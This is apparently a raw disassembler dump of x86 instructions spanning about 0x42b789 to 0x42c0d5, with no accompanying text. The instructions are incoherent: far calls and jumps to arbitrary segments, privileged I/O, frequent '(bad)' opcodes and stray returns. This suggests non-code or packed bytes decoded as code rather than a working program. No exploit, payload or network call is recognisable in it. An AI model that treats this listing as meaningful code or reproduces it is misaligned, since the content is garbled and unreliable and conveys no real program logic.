  42b789:	mov    ah,0x19
  42b78b:	ss retf 0x893d
  42b78f:	mov    eax,ds:0xfcb83446
  42b794:	repz sbb DWORD PTR [edx-0x42c30ba7],eax
  42b79b:	stos   BYTE PTR es:[edi],al
  42b79c:	popa   
  42b79d:	test   esi,0x9a7cf35f
  42b7a3:	mov    cl,0x58
  42b7a5:	leave  
  42b7a6:	cdq    
  42b7a7:	cmp    esi,ecx
  42b7a9:	or     BYTE PTR [esi+0x71],dh
  42b7ac:	sub    DWORD PTR [eax+0x62],edx
  42b7af:	das    
  42b7b0:	rcr    DWORD PTR [ebx-0x44afbcfa],cl
  42b7b6:	xchg   bl,bh
  42b7b8:	int    0xaf
  42b7ba:	ret    0x126e
  42b7bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b7be:	out    dx,eax
  42b7bf:	int    0xd7
  42b7c1:	fstp   TBYTE PTR [esi-0x27be1f1c]
  42b7c7:	(bad)  
  42b7c8:	mov    eax,DWORD PTR [edx]
  42b7ca:	das    
  42b7cb:	mov    ds:0x2bfeb2f1,al
  42b7d0:	xlat   BYTE PTR ds:[ebx]
  42b7d1:	adc    BYTE PTR [edi-0x20],0xec
  42b7d5:	into   
  42b7d6:	and    DWORD PTR [ebx-0x53],ecx
  42b7d9:	loop   0x42b78d
  42b7db:	sbb    al,BYTE PTR [ecx]
  42b7dd:	sub    BYTE PTR [ecx],0x75
  42b7e0:	stc    
  42b7e1:	or     al,0xac
  42b7e3:	sahf   
  42b7e4:	call   0x4a28:0x7afa792f
  42b7eb:	pop    edi
  42b7ec:	xlat   BYTE PTR ds:[ebx]
  42b7ed:	call   0x31c9b7ee
  42b7f2:	(bad)  
  42b7f3:	cwde   
  42b7f4:	clc    
  42b7f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b7f6:	jecxz  0x42b7e1
  42b7f8:	pop    ebx
  42b7f9:	cwde   
  42b7fa:	push   edx
  42b7fb:	mov    ebx,0xc8b6029b
  42b800:	mov    BYTE PTR [ebx-0x62],ah
  42b803:	ja     0x42b7d2
  42b805:	stos   DWORD PTR es:[edi],eax
  42b806:	sbb    al,0xaf
  42b808:	test   esp,ebp
  42b80a:	dec    edx
  42b80b:	lds    ecx,FWORD PTR [edx-0x68]
  42b80e:	out    0x76,eax
  42b810:	sbb    BYTE PTR [edx],al
  42b812:	xchg   ebp,eax
  42b813:	loope  0x42b88c
  42b815:	inc    esp
  42b816:	cmp    BYTE PTR [eax],dl
  42b818:	push   eax
  42b819:	inc    BYTE PTR [eax-0x65c48ce1]
  42b81f:	test   al,0x92
  42b821:	jp     0x42b820
  42b823:	arpl   ax,sp
  42b825:	xchg   edx,esp
  42b827:	push   0xffffffc1
  42b829:	les    esi,FWORD PTR [ecx-0x25]
  42b82c:	int    0xd6
  42b82e:	adc    esp,ecx
  42b830:	add    al,0x43
  42b832:	push   0xffffffeb
  42b834:	retf   0x0
	...
  42b893:	add    BYTE PTR [eax],al
  42b895:	add    al,ch
  42b897:	popf   
  42b898:	mov    esi,0xf9e7ffe7
  42b89d:	lahf   
  42b89e:	xor    bl,dh
  42b8a0:	add    ecx,DWORD PTR [esi+0x257b69e2]
  42b8a6:	rcl    ecx,1
  42b8a8:	add    DWORD PTR [eax],eax
  42b8aa:	pop    es
  42b8ab:	add    DWORD PTR [eax],eax
  42b8ad:	add    al,dl
  42b8af:	das    
  42b8b0:	nop
  42b8b1:	iret   
  42b8b2:	fist   DWORD PTR [esi]
  42b8b4:	imul   ecx,ebp,0x153642ab
  42b8ba:	fwait
  42b8bb:	jecxz  0x42b8a4
  42b8bd:	mov    DWORD PTR [ecx-0x474cd530],eax
  42b8c3:	and    BYTE PTR [edx+eiz*4+0xa],ch
  42b8c7:	pop    ss
  42b8c8:	mov    ds:0x508e416f,al
  42b8cd:	or     eax,eax
  42b8cf:	xor    BYTE PTR [ebp+0x7f47cc8c],ah
  42b8d5:	in     eax,dx
  42b8d6:	stos   DWORD PTR es:[edi],eax
  42b8d7:	sub    eax,0xef369091
  42b8dc:	outs   dx,BYTE PTR fs:[esi]
  42b8de:	fsubr  DWORD PTR [edi]
  42b8e0:	push   edi
  42b8e1:	pop    ss
  42b8e2:	sub    al,0x5f
  42b8e4:	mov    ah,0xff
  42b8e6:	xor    DWORD PTR [ecx+0x57],edx
  42b8e9:	gs addr16 dec ecx
  42b8ec:	outs   dx,DWORD PTR ds:[esi]
  42b8ed:	pop    eax
  42b8ee:	sbb    BYTE PTR [esi],0x1f
  42b8f1:	jg     0x42b92e
  42b8f3:	mov    gs,edi
  42b8f5:	cmc    
  42b8f6:	pop    es
  42b8f7:	inc    esp
  42b8f8:	adc    DWORD PTR [ebp+0x25],esi
  42b8fb:	je     0x42b972
  42b8fd:	enter  0xe41a,0x66
  42b901:	push   ds
  42b902:	cmp    DWORD PTR [ebx],edx
  42b904:	mov    ebx,ds
  42b906:	xor    al,0xc6
  42b908:	jl     0x42b8e3
  42b90a:	gs nop
  42b90c:	dec    ebp
  42b90d:	cmovnp edi,DWORD PTR [ebp-0x59c3cc94]
  42b914:	mov    ebx,0x7411a111
  42b919:	inc    esi
  42b91a:	out    0xeb,al
  42b91c:	lods   eax,DWORD PTR ds:[esi]
  42b91d:	fcomp  DWORD PTR [ebp+0x2]
  42b920:	mov    ah,BYTE PTR [edi-0x66]
  42b923:	inc    ecx
  42b924:	push   0x26287e47
  42b929:	pop    eax
  42b92a:	pop    ebp
  42b92b:	dec    edi
  42b92c:	aam    0xfd
  42b92e:	lods   al,BYTE PTR ds:[esi]
  42b92f:	aas    
  42b930:	xor    BYTE PTR [bp+si+0x4b3f],dl
  42b935:	test   eax,0xe5028c81
  42b93a:	pusha  
  42b93b:	mov    DWORD PTR [eax-0x4ff97a0b],edi
  42b941:	lea    esi,[edi-0x7a0e015d]
  42b947:	ins    DWORD PTR es:[edi],dx
  42b948:	or     al,0x56
  42b94a:	jmp    0x76f8e529
  42b94f:	cld    
  42b950:	push   ebx
  42b951:	jne    0x42b8de
  42b953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b954:	mov    ch,0x2c
  42b956:	ret    
  42b957:	pop    ds
  42b958:	jle    0x42b982
  42b95a:	sub    ah,BYTE PTR [eax-0x45]
  42b95d:	repz or eax,0x78e2fa22
  42b963:	mov    edi,0x2e8818c0
  42b968:	sub    ebp,DWORD PTR [esi+0x72]
  42b96b:	std    
  42b96c:	cmp    eax,DWORD PTR [edx+0x38]
  42b96f:	aam    0x3f
  42b971:	or     BYTE PTR [ecx+0xc],0x86
  42b975:	sub    BYTE PTR [ecx],ch
  42b977:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  42b979:	fld    TBYTE PTR [esi]
  42b97b:	lods   al,BYTE PTR ds:[esi]
  42b97c:	inc    esp
  42b97d:	push   ds
  42b97e:	sbb    BYTE PTR [ecx+0x1684dbbc],bl
  42b984:	mov    cl,0x9a
  42b986:	add    DWORD PTR [ecx+edi*2+0x12],esi
  42b98a:	(bad)  
  42b98b:	mov    ecx,0xb742ce0a
  42b990:	sbb    eax,0xdcd354ba
  42b995:	repnz xlat BYTE PTR ds:[ebx]
  42b997:	int    0xff
  42b999:	pop    esi
  42b99a:	and    eax,0x571e924d
  42b99f:	sub    al,0xd2
  42b9a1:	xchg   esi,eax
  42b9a2:	or     al,0xc8
  42b9a4:	fsub   st(3),st
  42b9a6:	push   0x5b
  42b9a8:	or     BYTE PTR [esi-0x7c],al
  42b9ab:	push   0x20
  42b9ad:	(bad)  
  42b9ae:	mov    al,0xe6
  42b9b0:	dec    esi
  42b9b1:	cmp    BYTE PTR [ecx+esi*2-0x33],dh
	...
  42ba15:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba1b:	neg    ebx
  42ba1d:	outs   dx,DWORD PTR ds:[esi]
  42ba1e:	xor    DWORD PTR [eax-0x80],eax
  42ba21:	fnstcw WORD PTR ds:0xd8ae90e5
  42ba27:	rol    BYTE PTR [ecx],cl
  42ba29:	add    BYTE PTR [edi],al
  42ba2b:	add    DWORD PTR [eax],eax
  42ba2d:	add    cl,bl
  42ba2f:	sub    al,BYTE PTR [ecx+0x6b]
  42ba32:	dec    eax
  42ba33:	push   eax
  42ba34:	xchg   esi,eax
  42ba35:	and    edi,ecx
  42ba37:	call   0x14390458
  42ba3c:	sub    ecx,DWORD PTR [edx+0x7544c5ce]
  42ba42:	outs   dx,DWORD PTR ds:[esi]
  42ba43:	nop
  42ba44:	dec    ecx
  42ba45:	ffree  st(1)
  42ba47:	cmp    BYTE PTR [ecx+0x7442496c],dh
  42ba4d:	push   ds
  42ba4e:	mov    bl,0x51
  42ba50:	(bad)  
  42ba51:	jmp    0x987741e4
  42ba56:	push   edx
  42ba57:	cmp    al,dh
  42ba59:	push   ss
  42ba5a:	(bad)  
  42ba5c:	hlt    
  42ba5d:	scas   eax,DWORD PTR es:[edi]
  42ba5e:	mov    WORD PTR [ebp+0x41],cs
  42ba61:	loop   0x42ba4f
  42ba63:	repnz push es
  42ba65:	gs cs dec esp
  42ba68:	pop    edi
  42ba69:	popf   
  42ba6a:	daa    
  42ba6b:	dec    ecx
  42ba6c:	xlat   BYTE PTR ds:[ebx]
  42ba6d:	(bad)  [eax]
  42ba6f:	ja     0x42ba3a
  42ba71:	stos   DWORD PTR es:[edi],eax
  42ba72:	add    BYTE PTR [edx-0x26067c09],0xa0
  42ba79:	scas   eax,DWORD PTR es:[edi]
  42ba7a:	add    al,0x5c
  42ba7c:	(bad)  
  42ba7d:	mov    ds:0x2b101b16,eax
  42ba82:	push   ebx
  42ba83:	lahf   
  42ba84:	sbb    cl,BYTE PTR ds:0x2ea237c7
  42ba8a:	pop    ds
  42ba8b:	dec    eax
  42ba8c:	mov    BYTE PTR [edx+eax*1+0x7255e8cf],ah
  42ba93:	inc    edx
  42ba94:	icebp  
  42ba95:	call   0xbd36f3e6
  42ba9a:	push   ecx
  42ba9b:	sbb    al,0x14
  42ba9d:	inc    ebx
  42ba9e:	(bad)  
  42baa0:	ret    0x5653
  42baa3:	cmpxchg DWORD PTR [edi+0x46cb9896],esp
  42baaa:	cmp    eax,0x5872dbf3
  42baaf:	dec    ebx
  42bab0:	iret   
  42bab1:	and    esi,DWORD PTR cs:[edi+0x3cc798a4]
  42bab8:	sbb    ah,BYTE PTR [ecx+0x26ccfd44]
  42babe:	sbb    cl,BYTE PTR [si]
  42bac1:	jecxz  0x42ba5a
  42bac3:	loope  0x42bb17
  42bac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bac6:	push   0x40
  42bac8:	mov    al,dh
  42baca:	mov    ds:0x16675543,al
  42bacf:	shl    BYTE PTR [esi-0x6b],cl
  42bad2:	inc    eax
  42bad3:	mov    eax,ds:0x4903b6da
  42bad8:	mov    BYTE PTR [edi+ecx*2+0x1f0ae5c3],bl
  42badf:	jg     0x42baa8
  42bae1:	jmp    0x42bb4c
  42bae3:	inc    esi
  42bae4:	adc    al,0xaf
  42bae6:	cmp    DWORD PTR [ebp-0x4cc5dcf0],esi
  42baec:	(bad)  
  42baed:	cmovno eax,DWORD PTR [ecx]
  42baf0:	xor    eax,DWORD PTR [edx-0x101e2208]
  42baf6:	mov    eax,0x3df7dba8
  42bafb:	xchg   esi,eax
  42bafc:	lods   eax,DWORD PTR ds:[esi]
  42bafd:	adc    al,0xbb
  42baff:	sbb    BYTE PTR [ebp-0x41844a91],ch
  42bb05:	inc    esp
  42bb06:	sub    eax,0x1f3e32b7
  42bb0b:	push   edx
  42bb0c:	cdq    
  42bb0d:	jno    0x42baa6
  42bb0f:	stc    
  42bb10:	popa   
  42bb11:	lahf   
  42bb12:	dec    ebx
  42bb13:	mov    esp,0xc4e1f551
  42bb18:	aas    
  42bb19:	dec    ecx
  42bb1a:	stos   DWORD PTR es:[edi],eax
  42bb1b:	or     bh,BYTE PTR [ecx]
  42bb1d:	cmp    eax,0xe99a6890
  42bb22:	repz jne 0x42bae3
  42bb25:	mov    bl,bl
  42bb27:	iret   
  42bb28:	inc    eax
  42bb29:	push   0xffffff80
  42bb2b:	jne    0x42baeb
  42bb2d:	cmp    eax,0xfc2df623
  42bb32:	cmp    esi,DWORD PTR [ebp+0x6f]
	...
  42bb94:	add    BYTE PTR [eax],al
  42bb96:	xor    al,0x28
  42bb98:	add    DWORD PTR [esi],eax
  42bb9a:	sbb    eax,0x283a372f
  42bb9f:	in     al,0xd1
  42bba1:	and    esi,edi
  42bba3:	adc    ecx,DWORD PTR [esi-0x7e]
  42bba6:	(bad)  
  42bba8:	add    DWORD PTR [eax],eax
  42bbaa:	pop    es
  42bbab:	add    DWORD PTR [eax],eax
  42bbad:	add    BYTE PTR [ebx],bh
  42bbaf:	rol    cl,1
  42bbb1:	xor    ecx,ecx
  42bbb3:	mov    dh,0x45
  42bbb5:	dec    ecx
  42bbb6:	mov    ebx,ebx
  42bbb8:	mov    al,0x5e
  42bbba:	sar    DWORD PTR [ecx],cl
  42bbbc:	dec    edi
  42bbbd:	add    al,0x47
  42bbbf:	dec    ebp
  42bbc0:	shl    DWORD PTR [edi],1
  42bbc2:	nop
  42bbc3:	test   DWORD PTR [edi+0x2c683ba1],edx
  42bbc9:	jecxz  0x42bb77
  42bbcb:	or     eax,0xf276e7b2
  42bbd0:	xchg   ebx,eax
  42bbd1:	imul   eax,esp,0xa2f6e33b
  42bbd7:	mov    BYTE PTR [ebp+0x7f],bl
  42bbda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bbdb:	sti    
  42bbdc:	adc    eax,0xeeb679ad
  42bbe1:	inc    ecx
  42bbe2:	jo     0x42bc54
  42bbe4:	es icebp 
  42bbe6:	and    dh,dl
  42bbe8:	add    ah,bh
  42bbea:	pop    esi
  42bbeb:	adc    DWORD PTR [edi],ebp
  42bbed:	iret   
  42bbee:	out    dx,eax
  42bbef:	ffree  st(5)
  42bbf1:	cmp    DWORD PTR [ecx],ebp
  42bbf3:	xor    al,0x18
  42bbf5:	cmp    BYTE PTR [ebx+0xf2dd845],0xba
  42bbfc:	inc    eax
  42bbfd:	mov    dl,0x48
  42bbff:	fisub  WORD PTR [edx]
  42bc01:	pop    es
  42bc02:	xlat   BYTE PTR ds:[ebx]
  42bc03:	pushf  
  42bc04:	add    eax,0x6dc53b4d
  42bc09:	iret   
  42bc0a:	fwait
  42bc0b:	repz cli 
  42bc0d:	xchg   esi,ebp
  42bc0f:	cdq    
  42bc10:	mov    ch,0x20
  42bc12:	repnz addr16 mov edi,0x2beb790c
  42bc19:	dec    ecx
  42bc1a:	adc    edi,DWORD PTR [esi]
  42bc1c:	rcr    DWORD PTR [ebp-0x73ba119e],0xd1
  42bc23:	xor    DWORD PTR [ecx],ebx
  42bc25:	sbb    al,0xf6
  42bc27:	aas    
  42bc28:	(bad)  
  42bc29:	iret   
  42bc2a:	icebp  
  42bc2b:	adc    al,0xb1
  42bc2d:	add    BYTE PTR [eax-0x6ebd2e59],bh
  42bc33:	adc    eax,0x9817938
  42bc38:	pop    edx
  42bc39:	sub    eax,0xa4ccb194
  42bc3e:	pop    edi
  42bc3f:	and    edx,DWORD PTR ds:0x721e3a6
  42bc45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc46:	mov    bl,0x92
  42bc48:	pop    ecx
  42bc49:	dec    ecx
  42bc4a:	ds or  ebx,esp
  42bc4d:	icebp  
  42bc4e:	stos   BYTE PTR es:[edi],al
  42bc4f:	loopne 0x42bcc2
  42bc51:	lahf   
  42bc52:	(bad)  
  42bc53:	hlt    
  42bc54:	retf   
  42bc55:	sbb    al,al
  42bc57:	cdq    
  42bc58:	lds    ecx,FWORD PTR [ebx-0x7e]
  42bc5b:	push   esp
  42bc5c:	dec    ecx
  42bc5e:	ds push 0x18
  42bc61:	rcr    DWORD PTR [edi-0x29b1372b],0xe3
  42bc68:	jo     0x42bc2c
  42bc6a:	out    0xf4,al
  42bc6c:	mov    ds:0xf9a720c0,eax
  42bc71:	gs in  eax,dx
  42bc73:	nop    ebp
  42bc76:	lods   al,BYTE PTR ds:[esi]
  42bc77:	mov    dh,0x61
  42bc79:	bound  eax,QWORD PTR [eax+0x67]
  42bc7c:	pusha  
  42bc7d:	jo     0x42bc69
  42bc7f:	(bad)  
  42bc80:	jle    0x42bcc8
  42bc82:	xor    DWORD PTR [edi+0x7b152267],esp
  42bc88:	or     ecx,DWORD PTR [ebx-0x46a1d380]
  42bc8e:	or     eax,0xbde32569
  42bc93:	in     eax,dx
  42bc94:	push   esp
  42bc95:	cdq    
  42bc96:	out    dx,al
  42bc97:	lahf   
  42bc98:	data16 sahf 
  42bc9a:	data16 daa 
  42bc9c:	add    ebx,ebp
  42bc9e:	xchg   esi,eax
  42bc9f:	add    edx,DWORD PTR [esi+0x4a]
  42bca2:	and    BYTE PTR [ebp+0x28],bh
  42bca5:	addr16 (bad) 
  42bca7:	call   0x2bfff640
  42bcac:	stos   DWORD PTR es:[edi],eax
  42bcad:	shl    BYTE PTR [eax],1
  42bcaf:	ror    DWORD PTR [ebx+edx*2-0x53],1
  42bcb3:	(bad)  
  42bcb4:	sub    DWORD PTR [eax],eax
	...
  42bd16:	mov    al,0xb6
  42bd18:	pushf  
  42bd19:	adc    al,0x9e
  42bd1b:	ds mov eax,0xde938ab6
  42bd21:	stc    
  42bd22:	jl     0x42bcd9
  42bd24:	daa    
  42bd25:	loope  0x42bd0d
  42bd27:	aam    0x1
  42bd29:	add    BYTE PTR [edi],al
  42bd2b:	add    DWORD PTR [eax],eax
  42bd2d:	add    bl,dh
  42bd2f:	clc    
  42bd30:	addr16 out 0xa0,eax
  42bd33:	(bad)
  42bd37:	(bad)  
  42bd38:	in     eax,dx
  42bd39:	jge    0x42bd57
  42bd3b:	inc    esi
  42bd3c:	popf   
  42bd3d:	mov    ebp,0x790a2104
  42bd42:	xor    eax,0x7d5209d4
  42bd47:	mov    dl,0xd1
  42bd49:	dec    edx
  42bd4a:	mov    DWORD PTR [eax+ebp*4],edx
  42bd4d:	(bad)  
  42bd4f:	gs dec edx
  42bd51:	push   eax
  42bd52:	push   ebx
  42bd53:	xor    al,0xe1
  42bd55:	inc    edi
  42bd56:	ja     0x42bd0d
  42bd58:	mov    es,WORD PTR [ecx-0x29]
  42bd5b:	push   eax
  42bd5c:	and    ebp,DWORD PTR [ebp+edx*1+0x5a]
  42bd60:	lods   al,BYTE PTR ds:[esi]
  42bd61:	pop    ebp
  42bd62:	push   esp
  42bd63:	sbb    BYTE PTR [ecx],dh
  42bd65:	icebp  
  42bd66:	in     eax,0x5
  42bd68:	call   0x46dc:0xae85a4e8
  42bd6f:	icebp  
  42bd70:	sub    DWORD PTR [esi+eiz*1],edi
  42bd73:	in     al,dx
  42bd74:	inc    edi
  42bd75:	push   esi
  42bd76:	adc    DWORD PTR ds:0x20299ead,ebx
  42bd7c:	dec    edi
  42bd7d:	sub    BYTE PTR [eax-0x23],0x18
  42bd81:	pop    ecx
  42bd82:	sbb    al,0xdc
  42bd84:	xor    DWORD PTR [edi],edi
  42bd86:	sbb    DWORD PTR [eax+0x40],ebx
  42bd89:	mov    al,0x83
  42bd8b:	shl    DWORD PTR fs:[ebx-0x8],0xfc
  42bd90:	push   0x18d54571
  42bd95:	sar    BYTE PTR [edx],1
  42bd97:	pop    ecx
  42bd98:	and    cl,BYTE PTR [esi-0x3]
  42bd9b:	sub    ebp,DWORD PTR [ecx]
  42bd9d:	ret    
  42bd9e:	lahf   
  42bd9f:	imul   edx,DWORD PTR [edx],0xc00880e2
  42bda5:	lea    edi,[eax-0x23]
  42bda8:	cmc    
  42bda9:	adc    BYTE PTR [edi],0x5f
  42bdac:	dec    esi
  42bdad:	mov    dh,0x47
  42bdaf:	loope  0x42bdb2
  42bdb1:	sub    BYTE PTR [esi-0x7d],bl
  42bdb4:	cmp    edx,DWORD PTR [ebx-0x4]
  42bdb7:	rcr    DWORD PTR [ecx],1
  42bdb9:	lock jp 0x42bd64
  42bdbc:	xor    al,ch
  42bdbe:	mov    bl,0xa6
  42bdc0:	pop    esp
  42bdc1:	xchg   edi,eax
  42bdc2:	mov    ah,0x56
  42bdc4:	push   0x6e1e99ca
  42bdc9:	and    BYTE PTR [ecx-0x15],dh
  42bdcc:	retf   0x6930
  42bdcf:	mov    DWORD PTR [ecx],ecx
  42bdd1:	pop    es
  42bdd2:	add    al,0xa8
  42bdd4:	and    eax,0xd7567c93
  42bdd9:	or     BYTE PTR [esi],dh
  42bddb:	bound  ebx,QWORD PTR [bp+di-0x1f]
  42bddf:	rcl    BYTE PTR [esi-0xb],0xd9
  42bde3:	push   edi
  42bde4:	inc    eax
  42bde5:	mov    ds:0xeda410ee,eax
  42bdea:	adc    ebx,DWORD PTR [ebx]
  42bdec:	enter  0xaffb,0xa9
  42bdf0:	jecxz  0x42bd9f
  42bdf2:	sub    eax,0x85b99821
  42bdf7:	sti    
  42bdf8:	ret    0xaaa3
  42bdfb:	jne    0x42be56
  42bdfd:	pop    ss
  42bdfe:	xchg   ecx,eax
  42bdff:	loope  0x42be75
  42be01:	jle    0x42be3b
  42be03:	xchg   ebx,eax
  42be04:	push   ecx
  42be05:	jnp    0x42be66
  42be07:	mov    dl,0x39
  42be09:	xchg   edi,eax
  42be0a:	(bad)  
  42be0c:	and    dh,BYTE PTR [esi]
  42be0e:	and    dh,dl
  42be10:	dec    ebx
  42be11:	mov    ebp,0x846c29ad
  42be16:	mov    ebx,0x8dbd4bd4
  42be1b:	jmp    0xc701f06
  42be20:	jg     0x42be73
  42be22:	lods   eax,DWORD PTR ds:[esi]
  42be23:	rcr    DWORD PTR [ebx+ebp*1-0x258515a5],1
  42be2a:	xchg   DWORD PTR [ebp+0x68],edx
  42be2d:	mov    ah,0xa8
  42be2f:	jnp    0x42be06
  42be31:	int3   
  42be32:	mov    dh,0xb6
  42be34:	jmp    0x0:0x0
	...
  42be93:	add    BYTE PTR [eax],al
  42be95:	add    BYTE PTR [edi-0x825b8e0],dl
  42be9b:	call   FWORD PTR [edi-0x24a78c93]
  42bea1:	fld    QWORD PTR [esi+0x46]
  42bea4:	neg    DWORD PTR [ecx+0x1d5ed]
  42beaa:	pop    es
  42beab:	add    DWORD PTR [eax],eax
  42bead:	add    BYTE PTR [eax],dl
  42beaf:	and    DWORD PTR [ebx+ecx*2],ecx
  42beb2:	push   ebx
  42beb3:	dec    eax
  42beb4:	pop    ebx
  42beb5:	stc    
  42beb6:	sbb    BYTE PTR [ebx],bl
  42beb8:	imul   esp,ecx,0xc06210b1
  42bebe:	ficomp DWORD PTR [edi]
  42bec0:	push   ss
  42bec1:	sti    
  42bec2:	bound  ecx,QWORD PTR [eax+0x38]
  42bec5:	xor    esi,DWORD PTR ss:[edx+0x66ca4805]
  42becc:	sbb    DWORD PTR [eax+eiz*8+0x6b],esi
  42bed0:	aaa    
  42bed1:	dec    ecx
  42bed2:	out    dx,eax
  42bed3:	cdq    
  42bed4:	scas   eax,DWORD PTR es:[edi]
  42bed5:	adc    bl,BYTE PTR [edx-0x26]
  42bed8:	aam    0xf1
  42beda:	es sub al,0x4a
  42bedd:	imul   ebp,DWORD PTR [ebp+0x35],0x35
  42bee1:	dec    ecx
  42bee2:	jg     0x42be85
  42bee4:	js     0x42be89
  42bee6:	add    eax,DWORD PTR [esp+edx*1+0x36]
  42beea:	sub    ebp,edi
  42beec:	fsqrt  
  42beee:	sbb    al,0x52
  42bef0:	xor    BYTE PTR [ebp-0x2f],dh
  42bef3:	inc    BYTE PTR [ebp+esi*4-0x3b]
  42bef7:	pusha  
  42bef8:	mov    eax,ds:0xee40abbd
  42befd:	jl     0x42befb
  42beff:	lds    esp,FWORD PTR [esi+esi*4+0x0]
  42bf03:	push   esi
  42bf04:	lahf   
  42bf05:	jp     0x42be92
  42bf07:	(bad)  
  42bf08:	and    edx,ecx
  42bf0a:	sbb    edi,DWORD PTR [edi+0x6eb9081d]
  42bf10:	push   eax
  42bf11:	iret   
  42bf12:	sti    
  42bf13:	mov    cl,ah
  42bf15:	xchg   DWORD PTR [esi],edi
  42bf17:	iret   
  42bf18:	jns    0x42bf85
  42bf1a:	ficomp DWORD PTR [edx]
  42bf1c:	stos   DWORD PTR es:[edi],eax
  42bf1d:	scas   eax,DWORD PTR es:[edi]
  42bf1e:	mov    ebx,DWORD PTR [ebx+edi*8-0x48]
  42bf22:	lds    eax,FWORD PTR [esi-0x16305dd0]
  42bf28:	jle    0x42bf42
  42bf2a:	cmp    eax,edi
  42bf2c:	mov    ebp,0xe835b4b9
  42bf31:	imul   edi,DWORD PTR [edx-0x7ddbdc9a],0xffffffa7
  42bf38:	pop    ebp
  42bf39:	xor    DWORD PTR [edx+0x4bf7ab83],ecx
  42bf3f:	sbb    edx,DWORD PTR [esi-0x496f8373]
  42bf45:	push   es
  42bf46:	xor    esi,DWORD PTR [edi]
  42bf48:	imul   eax,DWORD PTR ds:0x701c2eac,0x8d4103cc
  42bf52:	aam    0x4d
  42bf54:	push   ss
  42bf55:	jge    0x42bee4
  42bf57:	mov    ch,0xba
  42bf59:	enter  0xdaac,0xa5
  42bf5d:	call   0xef62:0x998d6d5a
  42bf64:	clc    
  42bf65:	or     DWORD PTR [ebx+0x3e],ecx
  42bf68:	cmp    DWORD PTR [ecx],ebx
  42bf6a:	pusha  
  42bf6b:	cmp    ebx,ebp
  42bf6d:	jne    0x42bfa5
  42bf6f:	(bad)  
  42bf70:	cmp    BYTE PTR [ebx-0x7325180a],cl
  42bf76:	in     al,dx
  42bf77:	pop    eax
  42bf78:	call   0xe423bf73
  42bf7d:	in     eax,dx
  42bf7e:	pop    ss
  42bf7f:	add    eax,0xbf4361b2
  42bf84:	outs   dx,DWORD PTR ds:[esi]
  42bf85:	(bad)  
  42bf86:	dec    bx
  42bf88:	out    dx,eax
  42bf89:	jge    0x42bfe5
  42bf8b:	and    DWORD PTR [esi],ebx
  42bf8d:	xor    al,0x1d
  42bf8f:	stos   BYTE PTR es:[edi],al
  42bf90:	cmp    dl,bl
  42bf92:	leave  
  42bf93:	test   bl,dl
  42bf95:	inc    eax
  42bf96:	int    0xd5
  42bf98:	mov    dh,0x64
  42bf9a:	sub    al,0x3e
  42bf9c:	inc    edi
  42bf9d:	outs   dx,DWORD PTR ds:[esi]
  42bf9e:	sbb    DWORD PTR [edx],ebp
  42bfa0:	dec    edx
  42bfa1:	test   eax,0x7ea95f84
  42bfa6:	inc    ebp
  42bfa7:	loopne 0x42bf8c
  42bfa9:	jmp    0xe256:0x5accba8e
  42bfb0:	cdq    
  42bfb1:	lods   al,BYTE PTR ds:[esi]
  42bfb2:	scas   al,BYTE PTR es:[edi]
  42bfb3:	pop    esi
  42bfb4:	ins    DWORD PTR es:[edi],dx
	...
  42c015:	add    BYTE PTR [edx],bh
  42c017:	xchg   edx,eax
  42c018:	ja     0x42c04c
  42c01a:	push   edi
  42c01c:	jg     0x42bfb8
  42c01e:	xchg   ebx,eax
  42c01f:	mov    al,ds:0x3933f806
  42c024:	xlat   BYTE PTR ds:[ebx]
  42c025:	aaa    
  42c026:	hlt    
  42c027:	(bad)  
  42c028:	add    DWORD PTR [eax],eax
  42c02a:	pop    es
  42c02b:	add    DWORD PTR [eax],eax
  42c02d:	add    BYTE PTR [esi-0x13],ah
  42c030:	mov    ah,0x47
  42c032:	repz loope 0x42c08a
  42c035:	gs out dx,eax
  42c037:	xchg   esi,eax
  42c038:	xor    eax,0xe18d1e76
  42c03d:	ffree  st(7)
  42c03f:	pushf  
  42c040:	cs sub al,0x3b
  42c043:	xor    BYTE PTR [eax],ah
  42c045:	lahf   
  42c046:	loope  0x42c000
  42c048:	in     al,0x83
  42c04a:	in     al,0xd1
  42c04c:	cmc    
  42c04d:	(bad)
  42c052:	mov    edx,0x8ca6c6cd
  42c057:	pop    eax
  42c058:	sbb    dl,BYTE PTR fs:[ecx+ebp*1+0x79]
  42c05d:	add    BYTE PTR [edx],cl
  42c05f:	adc    DWORD PTR [ebp-0x76643e55],ebp
  42c065:	push   esp
  42c066:	mov    ebx,0x6e8d5f75
  42c06b:	in     al,dx
  42c06c:	pop    esi
  42c06d:	sbb    dh,ch
  42c06f:	mov    bl,0x5d
  42c071:	das    
  42c072:	mov    al,0x11
  42c074:	add    edi,DWORD PTR [eax-0x53]
  42c077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c078:	std    
  42c079:	cwde   
  42c07a:	sar    DWORD PTR ds:0xf76e7e7b,0x8
  42c081:	dec    ebx
  42c082:	add    BYTE PTR [ebp+0x1092e6e6],dh
  42c088:	jne    0x42c0ac
  42c08a:	add    eax,0xa89470f9
  42c08f:	add    al,ah
  42c091:	adc    BYTE PTR [edx+0x49cf11c5],0xad
  42c098:	mov    cl,0x61
  42c09a:	and    DWORD PTR [edx+0x32b08287],edx
  42c0a0:	cmp    DWORD PTR [eax],0xfffffff1
  42c0a3:	clc    
  42c0a4:	retf   
  42c0a5:	rol    BYTE PTR [ebx-0xf],0xe2
  42c0a9:	les    edx,FWORD PTR [esi]
  42c0ab:	mov    al,ds:0x5e58bda9
  42c0b0:	into   
  42c0b1:	clc    
  42c0b2:	xchg   ebx,eax
  42c0b3:	push   ebx
  42c0b4:	xchg   ebp,eax
  42c0b5:	xchg   ecx,eax
  42c0b6:	pop    edx
  42c0b7:	mov    dl,0x5b
  42c0b9:	mov    ebp,0x62fade6c
  42c0be:	adc    eax,0x718bfcc9
  42c0c3:	xchg   esi,eax
  42c0c4:	cdq    
  42c0c5:	out    0x5f,eax
  42c0c7:	in     al,dx
  42c0c8:	stc    
  42c0c9:	and    al,0xeb
  42c0cb:	mov    DWORD PTR [eax+0x6d],ecx
  42c0ce:	call   0xfeb3:0xe4995484
  42c0d5:	retf   0x698b
